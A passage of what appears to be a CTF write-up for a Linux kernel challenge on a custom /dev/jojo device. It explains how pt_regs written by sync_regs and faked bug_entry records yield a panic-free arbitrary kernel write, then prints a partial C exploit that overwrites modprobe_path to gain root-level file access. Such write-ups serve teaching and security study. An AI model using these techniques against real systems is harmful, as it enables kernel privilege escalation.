+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a>#1  enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff82eef448</span><span class="op">)</span> at <span class="op">./</span>include<span class="op">/</span>linux<span class="op">/</span>irq<span class="op">-</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">91</span></span>
+<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a>#2  syscall_enter_from_user_mode <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff82eef448</span><span class="op">,</span> syscall<span class="op">=</span><span class="bn">0x1</span><span class="op">)</span> at <span class="op">./</span>include<span class="op">/</span>linux<span class="op">/</span>entry<span class="op">-</span>common<span class="op">.</span>h<span class="op">:</span><span class="dv">183</span></span>
+<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a>#3  do_syscall_64 <span class="op">(</span>regs<span class="op">=</span><span class="bn">0xffffffff82eef448</span><span class="op">,</span> nr<span class="op">=</span><span class="bn">0x1</span><span class="op">)</span> at arch<span class="op">/</span>x86<span class="op">/</span>entry<span class="op">/</span>syscall_64<span class="op">.</span>c<span class="op">:</span><span class="dv">90</span></span>
+<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a>#4  0xffffffff81000130 <span class="bu">in</span> entry_SYSCALL_64 <span class="op">()</span> at arch<span class="op">/</span>x86<span class="op">/</span>entry<span class="op">/</span>entry_64<span class="op">.</span>S<span class="op">:</span><span class="dv">121</span></span>
+<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a>#5  0x6555555555555555 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a>#6  0x0000000023dae610 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a>#7  0x000000000000001c <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a>#8  0x000000000000001c <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a>#9  0x00007ffd71b1a2d0 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a>#10 0x00000000004b2300 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a>#11 0x0000000000000202 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span>
+<span id="cb9-14"><a href="#cb9-14" aria-hidden="true" tabindex="-1"></a>#12 0x0000000000000000 <span class="bu">in</span> <span class="op">??</span> <span class="op">()</span></span></code></pre></div>
+<p>This one is triggered via a syscall rather than an interrupt. But the
+rest is the same.</p>
+<p>So we control where pt_regs is stored. We can confirm this by setting
+a hardware watchpoint on our target address. We’re getting a little
+nastier with gdb: <code>awatch *(unsigned long*)target</code></p>
+<blockquote>
+<p>The careful reader may have already noticed that in almost all
+trap-handling and interrupt paths, we use pt_regs.</p>
+</blockquote>
+<p>When we run our code again, the execution breaks in
+<code>sync_regs</code> in
+<code>asm_sysvec_apic_timer_interrupt</code>:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef CONFIG_X86_64</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="co">/*</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="co"> * Help handler running on a per-cpu (IST or entry trampoline) stack</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a><span class="co"> * to switch to the normal thread stack if the interrupted code was in</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="co"> * user mode. The actual stack switch is done in entry_64.S</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a><span class="co"> */</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>asmlinkage __visible noinstr <span class="kw">struct</span> pt_regs <span class="op">*</span>sync_regs<span class="op">(</span><span class="kw">struct</span> pt_regs <span class="op">*</span>eregs<span class="op">)</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>    <span class="kw">struct</span> pt_regs <span class="op">*</span>regs <span class="op">=</span> <span class="op">(</span><span class="kw">struct</span> pt_regs <span class="op">*)</span>current_top_of_stack<span class="op">()</span> <span class="op">-</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>regs <span class="op">!=</span> eregs<span class="op">)</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">*</span>regs <span class="op">=</span> <span class="op">*</span>eregs<span class="op">;</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> regs<span class="op">;</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>This copies our registers to our controlled memory. And by setting
+our registers beforehand (<a
+href="https://www.felixcloutier.com/documents/gcc-asm.html">inline
+assembly fun</a>), we can write those values to a controlled memory
+location. But we trigger a panic afterwards. So it looks like our
+“stand” (primitive) is actually powerful that is yet to achieve its full
+potential.</p>
+<blockquote>
+<p>Just a heads up, it does not call <code>sync_regs</code> in the
+<code>do_syscall_64</code> trap call flow. Either you can pray for a
+timer interrupt before a syscall happens, or, you can make an infinite
+loop right after the ioctl call to block the syscalls for that
+thread.</p>
+</blockquote>
+<h2 id="x03.-activating-our-stands-full-potential">0x03. Activating our
+stand’s full potential</h2>
+<p>Now that we have unraveled the mystery of Dio’s trap, we can make a
+plan:</p>
+<ul>
+<li>Use the first trigger to overwrite a fake
+<code>bug_entry</code>.</li>
+</ul>
+<blockquote>
+<p>when handling the interrupt/bug, the call flow must include
+sync_regs() at some point. otherwise your registers won’t be written.
+that’s why we want to be interrupted by the timer instead of
+do_syscall_64.</p>
+</blockquote>
+<ul>
+<li><p>Place it at <code>__start___bug_table</code> so it’s found
+first.</p></li>
+<li><p>Set correct <code>bug_addr_disp</code> and the flags so that the
+bug_entry is marked as “done”</p></li>
+</ul>
+<p>Macros for the flags are defined <a
+href="https://elixir.bootlin.com/linux/v7.0/source/include/asm-generic/bug.h#L11">here</a>
+as:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef CONFIG_GENERIC_BUG</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_WARNING     </span><span class="op">(</span><span class="dv">1</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">0</span><span class="op">)</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_ONCE        </span><span class="op">(</span><span class="dv">1</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">1</span><span class="op">)</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_DONE        </span><span class="op">(</span><span class="dv">1</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">2</span><span class="op">)</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_NO_CUT_HERE </span><span class="op">(</span><span class="dv">1</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">3</span><span class="op">)</span><span class="pp">    </span><span class="co">/* CUT_HERE already sent */</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_ARGS        </span><span class="op">(</span><span class="dv">1</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">4</span><span class="op">)</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUGFLAG_TAINT</span><span class="op">(</span><span class="pp">taint</span><span class="op">)</span><span class="pp">    </span><span class="op">((</span><span class="pp">taint</span><span class="op">)</span><span class="pp"> </span><span class="op">&lt;&lt;</span><span class="pp"> </span><span class="dv">8</span><span class="op">)</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define BUG_GET_TAINT</span><span class="op">(</span><span class="pp">bug</span><span class="op">)</span><span class="pp">  </span><span class="op">((</span><span class="pp">bug</span><span class="op">)-&gt;</span><span class="pp">flags </span><span class="op">&gt;&gt;</span><span class="pp"> </span><span class="dv">8</span><span class="op">)</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span></code></pre></div>
+<p>We want warning + once + done = which is 0x7. And reversing the
+<code>bugaddr</code> formula from earlier gives us:
+<code>addr_disp = bugaddr - &amp;bug_entry</code></p>
+<p>So once we set those correctly in our registers, when
+<code>find_bug()</code> runs it hits our fake entry first. Since DONE is
+set, it returns early, no warning means no panic.</p>
+<p>At this point we effectively have an arbitrary write primitive in the
+kernel without triggering a panic. From here you can overwrite
+modprobe_path, core_pattern or the cred struct and such… But you might
+need to fake a few more bug entries (e.g, in
+<code>__alloc_frozen_pages_noprof</code> or <code>___ratelimit</code>.
+depends on what you’re doing).</p>
+<h2 id="x04.-beating-dio">0x04. Beating Dio</h2>
+<p>An outstanding stand user (blue belt) got the 🩸 and solved the
+challenge within a few days. Much congrats to <a
+href="https://pwn.college/hacker/121187">whoami_mr_x!</a>, they were the
+only one who managed to beat Dio.</p>
+<p>They did … bla bla exploit details</p>
+<center>
+<img src=/blog/actf/pics/dio-wine.gif>
+<p>
+Here’s the full exploit:
+</p>
+</center>
+<div class="sourceCode" id="cb12"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#define </span><span class="ot">_GNU_SOURCE</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/ioctl.h&gt;</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/sendfile.h&gt;</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/resource.h&gt;</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/stat.h&gt;</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sys/socket.h&gt;</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;linux/if_alg.h&gt;</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="dt">unsigned</span> <span class="dt">long</span> <span class="dt">long</span> <span class="dt">int</span> u64<span class="op">;</span></span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a><span class="co">// for inline assembly</span></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 asm_fd<span class="op">;</span></span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 asm_child_fd<span class="op">;</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 asm_target<span class="op">;</span></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 asm_child_target<span class="op">;</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 MODPROBE_QWORD0<span class="op">;</span></span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 MODPROBE_QWORD1<span class="op">;</span></span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a><span class="dt">volatile</span> u64 MODPROBE_QWORD2<span class="op">;</span></span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a><span class="pp">#define MODPROBE </span><span class="bn">0xffffffff82f4aec0</span></span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="co">// small delay without calling a syscall (sleep)</span></span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="dt">static</span> <span class="dt">void</span> small_delay<span class="op">(</span><span class="dt">unsigned</span> <span class="dt">long</span> n<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">volatile</span> <span class="dt">unsigned</span> <span class="dt">long</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> n<span class="op">;</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>        asm <span class="dt">volatile</span><span class="op">(</span><span class="st">&quot;pause&quot;</span> <span class="op">:::</span> <span class="st">&quot;memory&quot;</span><span class="op">);</span></span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a><span class="co">// dont forget to change the paths for your environment </span></span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> make_modprobe_script<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/home/user/y&quot;</span><span class="op">,</span> O_WRONLY <span class="op">|</span> O_CREAT <span class="op">|</span> O_TRUNC<span class="op">,</span> <span class="bn">0777</span><span class="op">);</span></span>
+<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> <span class="dt">char</span> script<span class="op">[]</span> <span class="op">=</span></span>
+<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;#!/bin/sh</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;chmod 777 /flag</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">;</span></span>
+<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a>    write<span class="op">(</span>fd<span class="op">,</span> script<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>script<span class="op">)</span> <span class="op">-</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a>    close<span class="op">(</span>fd<span class="op">);</span></span>
+<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a>    chmod<span class="op">(</span><span class="st">&quot;/home/user/y&quot;</span><span class="op">,</span> <span class="bn">0777</span><span class="op">);</span></span>
+<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> make_binfmt_trigger<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-52"><a href="#cb12-52" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/home/user/x&quot;</span><span class="op">,</span> O_WRONLY <span class="op">|</span> O_CREAT <span class="op">|</span> O_TRUNC<span class="op">,</span> <span class="bn">0777</span><span class="op">);</span></span>
+<span id="cb12-53"><a href="#cb12-53" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>fd <span class="op">&gt;=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-54"><a href="#cb12-54" aria-hidden="true" tabindex="-1"></a>        <span class="dt">static</span> <span class="dt">const</span> <span class="dt">unsigned</span> <span class="dt">char</span> bad<span class="op">[]</span> <span class="op">=</span> <span class="op">{</span> <span class="bn">0xff</span><span class="op">,</span> <span class="bn">0xff</span><span class="op">,</span> <span class="bn">0xff</span><span class="op">,</span> <span class="bn">0xff</span><span class="op">,</span> <span class="ch">&#39;</span><span class="sc">\n</span><span class="ch">&#39;</span> <span class="op">};</span></span>
+<span id="cb12-55"><a href="#cb12-55" aria-hidden="true" tabindex="-1"></a>        write<span class="op">(</span>fd<span class="op">,</span> bad<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>bad<span class="op">));</span></span>
+<span id="cb12-56"><a href="#cb12-56" aria-hidden="true" tabindex="-1"></a>        close<span class="op">(</span>fd<span class="op">);</span></span>
+<span id="cb12-57"><a href="#cb12-57" aria-hidden="true" tabindex="-1"></a>        chmod<span class="op">(</span><span class="st">&quot;/home/user/x&quot;</span><span class="op">,</span> <span class="bn">0777</span><span class="op">);</span></span>
+<span id="cb12-58"><a href="#cb12-58" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-59"><a href="#cb12-59" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-60"><a href="#cb12-60" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-61"><a href="#cb12-61" aria-hidden="true" tabindex="-1"></a><span class="co">// overwrites modprobe path</span></span>
+<span id="cb12-62"><a href="#cb12-62" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> child_irq_writer<span class="op">(){</span></span>
+<span id="cb12-63"><a href="#cb12-63" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> child_fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/dev/jojo&quot;</span><span class="op">,</span> <span class="bn">0644</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb12-64"><a href="#cb12-64" aria-hidden="true" tabindex="-1"></a>    asm_child_target <span class="op">=</span> MODPROBE <span class="op">+</span> <span class="bn">0xa8</span><span class="op">;</span></span>
+<span id="cb12-65"><a href="#cb12-65" aria-hidden="true" tabindex="-1"></a>    asm_child_fd <span class="op">=</span> <span class="op">(</span>u64<span class="op">)</span> child_fd<span class="op">;</span></span>
+<span id="cb12-66"><a href="#cb12-66" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-67"><a href="#cb12-67" aria-hidden="true" tabindex="-1"></a>    MODPROBE_QWORD0 <span class="op">=</span> <span class="bn">0x73752f656d6f682f</span><span class="op">;</span></span>
+<span id="cb12-68"><a href="#cb12-68" aria-hidden="true" tabindex="-1"></a>    MODPROBE_QWORD1 <span class="op">=</span> <span class="bn">0x00000000792f7265</span><span class="op">;</span></span>
+<span id="cb12-69"><a href="#cb12-69" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-70"><a href="#cb12-70" aria-hidden="true" tabindex="-1"></a>    asm <span class="dt">volatile</span><span class="op">(</span></span>
+<span id="cb12-71"><a href="#cb12-71" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq MODPROBE_QWORD1(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">r14</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-72"><a href="#cb12-72" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq MODPROBE_QWORD0(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">r15</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-73"><a href="#cb12-73" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r8, </span><span class="sc">%%</span><span class="st">r8</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-74"><a href="#cb12-74" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r9, </span><span class="sc">%%</span><span class="st">r9</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-75"><a href="#cb12-75" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r10, </span><span class="sc">%%</span><span class="st">r10</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-76"><a href="#cb12-76" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r11, </span><span class="sc">%%</span><span class="st">r11</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-77"><a href="#cb12-77" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r12, </span><span class="sc">%%</span><span class="st">r12</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-78"><a href="#cb12-78" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r13, </span><span class="sc">%%</span><span class="st">r13</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-79"><a href="#cb12-79" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq asm_child_fd(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">rdi</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-80"><a href="#cb12-80" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq asm_child_target(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">rdx</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-81"><a href="#cb12-81" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;mov $16, </span><span class="sc">%%</span><span class="st">eax</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-82"><a href="#cb12-82" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;syscall</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-83"><a href="#cb12-83" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;1:</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-84"><a href="#cb12-84" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;pause</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-85"><a href="#cb12-85" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;jmp 1b</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-86"><a href="#cb12-86" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb12-87"><a href="#cb12-87" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb12-88"><a href="#cb12-88" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span> <span class="st">&quot;rax&quot;</span><span class="op">,</span><span class="st">&quot;rbx&quot;</span><span class="op">,</span><span class="st">&quot;rcx&quot;</span><span class="op">,</span><span class="st">&quot;rdx&quot;</span><span class="op">,</span><span class="st">&quot;rdi&quot;</span><span class="op">,</span><span class="st">&quot;rsi&quot;</span><span class="op">,</span></span>
+<span id="cb12-89"><a href="#cb12-89" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;r8&quot;</span><span class="op">,</span><span class="st">&quot;r9&quot;</span><span class="op">,</span><span class="st">&quot;r10&quot;</span><span class="op">,</span><span class="st">&quot;r11&quot;</span><span class="op">,</span><span class="st">&quot;r12&quot;</span><span class="op">,</span><span class="st">&quot;r13&quot;</span><span class="op">,</span><span class="st">&quot;r14&quot;</span><span class="op">,</span><span class="st">&quot;r15&quot;</span><span class="op">,</span><span class="st">&quot;memory&quot;</span></span>
+<span id="cb12-90"><a href="#cb12-90" aria-hidden="true" tabindex="-1"></a>      <span class="op">);</span></span>
+<span id="cb12-91"><a href="#cb12-91" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-92"><a href="#cb12-92" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-93"><a href="#cb12-93" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-94"><a href="#cb12-94" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> read_flag<span class="op">(){</span></span>
+<span id="cb12-95"><a href="#cb12-95" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd_f<span class="op">;</span></span>
+<span id="cb12-96"><a href="#cb12-96" aria-hidden="true" tabindex="-1"></a>    fd_f <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/flag&quot;</span><span class="op">,</span> O_RDONLY<span class="op">);</span></span>
+<span id="cb12-97"><a href="#cb12-97" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>fd_f <span class="op">==</span> <span class="op">-</span><span class="dv">1</span><span class="op">)</span></span>
+<span id="cb12-98"><a href="#cb12-98" aria-hidden="true" tabindex="-1"></a>        puts<span class="op">(</span><span class="st">&quot;failed&quot;</span><span class="op">);</span></span>
+<span id="cb12-99"><a href="#cb12-99" aria-hidden="true" tabindex="-1"></a>    sendfile<span class="op">(</span><span class="dv">1</span><span class="op">,</span> fd_f<span class="op">,</span> NULL<span class="op">,</span> <span class="bn">0x50</span><span class="op">);</span></span>
+<span id="cb12-100"><a href="#cb12-100" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-101"><a href="#cb12-101" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-102"><a href="#cb12-102" aria-hidden="true" tabindex="-1"></a><span class="co">// trigger alg_bind -&gt; request_module</span></span>
+<span id="cb12-103"><a href="#cb12-103" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> trigger<span class="op">(){</span></span>
+<span id="cb12-104"><a href="#cb12-104" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> alg_fd <span class="op">=</span> socket<span class="op">(</span>AF_ALG<span class="op">,</span> SOCK_SEQPACKET<span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb12-105"><a href="#cb12-105" aria-hidden="true" tabindex="-1"></a>        <span class="kw">struct</span> sockaddr_alg sa<span class="op">;</span></span>
